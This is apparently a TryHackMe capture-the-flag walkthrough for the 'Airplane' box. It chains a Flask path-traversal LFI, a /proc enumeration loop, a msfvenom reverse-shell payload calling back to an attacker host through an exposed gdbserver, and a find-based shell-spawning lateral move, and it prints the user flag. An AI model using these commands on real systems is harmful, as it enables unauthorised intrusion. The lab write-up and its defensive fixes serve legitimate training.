---
title: "Airplane (TryHackMe) — Walkthrough: LFI to gdbserver RCE to SUID Lateral Move"
description: "TryHackMe Airplane walkthrough — turning a Flask LFI into process recon, exploiting an exposed gdbserver for RCE, then abusing a SUID euid mismatch to reach the user flag."
date: 2026-07-05 09:00:00 +0000
categories: [CTF]
tags: [ctf, tryhackme, linux, lfi, rce, gdbserver, privilege-escalation]
difficulty: Easy
---

> **Box:** TryHackMe — Airplane · **OS:** Linux (Ubuntu) · **Theme:** LFI → exposed gdbserver RCE → SUID lateral movement

Airplane is a genuinely instructive Linux box. A Flask app leaks files through an LFI, and that single bug is the key to everything — I used it not just to read `/etc/passwd`, but to fingerprint the running processes, which exposed a **gdbserver** listening to the world. That became my foothold, and a classic SUID trick moved me laterally to the user flag.

## Recon

```bash
export target=10.48.191.126
rustscan -a $target -- -A
```

Three ports came back:

- **22/tcp** — OpenSSH 8.2p1 (Ubuntu)
- **6048/tcp** — nmap could only guess `x11?`, but this turned out to be far more interesting *(spoiler: gdbserver)*
- **8000/tcp** — Werkzeug / Python 3.8 → a **Flask** web app

## Enumeration — Port 8000

The app immediately redirects to `http://airplane.thm:8000/?page=index.html`, so the first step was mapping the hostname:

```bash
echo "10.48.191.126 airplane.thm" | sudo tee -a /etc/hosts
```

A content scan turned up an `/airplane` endpoint:

```bash
feroxbuster -u http://airplane.thm:8000/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
# 302  GET  /         => /?page=index.html
# 200  GET  /airplane
```

But the real eye-catcher was that `?page=` parameter. Any time a page is loaded by name through a query string, **LFI** is the first thing I test.

## Local File Inclusion (LFI)

```bash
curl http://airplane.thm:8000/?page=./../../../../etc/passwd
```

It dumped `/etc/passwd` cleanly. Two human users stood out:

```text
carlos:x:1000:1000:carlos,,,:/home/carlos:/bin/bash
hudson:x:1001:1001::/home/hudson:/bin/bash
```

## Turning LFI into recon — finding the gdbserver

LFI reads a lot more than config files — `/proc/<pid>/cmdline` reveals exactly what each process is running. I looped through PIDs to reconstruct the process table:

```bash
for i in {1..1000}; do out=$(curl -s "http://airplane.thm:8000/?page=../../../../../proc/$i/cmdline" | sed 's/\x00/ /g' | grep -v 'Page not found'); if [ -n "$out" ]; then echo "$i : $out"; fi; done
```

Buried in the output was the answer to that mystery port 6048:

```text
534 : /usr/bin/gdbserver 0.0.0.0:6048 airplane
```

An **exposed gdbserver** bound to all interfaces — that's a direct remote code execution primitive.

## Foothold — exploiting gdbserver

The technique is standard: build an ELF reverse-shell payload, load it in a local gdb, then attach to the remote gdbserver and run it. `PrependFork=true` keeps the debugged process alive after the shell fires.

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.143.238 LPORT=443 PrependFork=true -f elf -o binary.elf
```

```bash
gdb binary.elf
(gdb) target extended-remote airplane.thm:6048
(gdb) run
```

With a listener waiting on port 443, the reverse shell landed.

## Lateral Movement → user.txt

Checking privileges revealed an interesting mismatch — running as **hudson**, but with **carlos** as the effective UID:

```bash
id
# uid=1001(hudson) gid=1001(hudson) euid=1000(carlos) groups=1001(hudson)
```

That `euid` is the opening. A `find` that spawns a privilege-preserving shell (`-p`) drops me in as carlos:

```bash
find . -exec /bin/sh -p \; -quit
```

And the user flag:

```bash
cd /home/carlos
cat user.txt
# eebfca2ca5a2b8a56c46c781aeea7562
```

## Privilege Escalation — root

*(This run's notes stop at the user flag.)* The natural next move from carlos is the first check I always run — `sudo -l` — to hunt for a root-runnable binary that can be abused via GTFOBins. I'll fill this section in once I've captured the root path.

## Takeaways

- **LFI is a Swiss Army knife.** It's not just `/etc/passwd` — reading `/proc/*/cmdline` mapped the entire process table and exposed the gdbserver that made this box.
- **gdbserver on `0.0.0.0` is game over.** An exposed debugger is remote code execution by design.
- **Watch the euid, not just the uid.** The privilege mismatch after the foothold is exactly what enabled the lateral move to carlos.
- **Defensive fixes:** sanitise file-path parameters (allowlist, block traversal), never bind gdbserver to public interfaces, and avoid SUID binaries that can spawn shells.
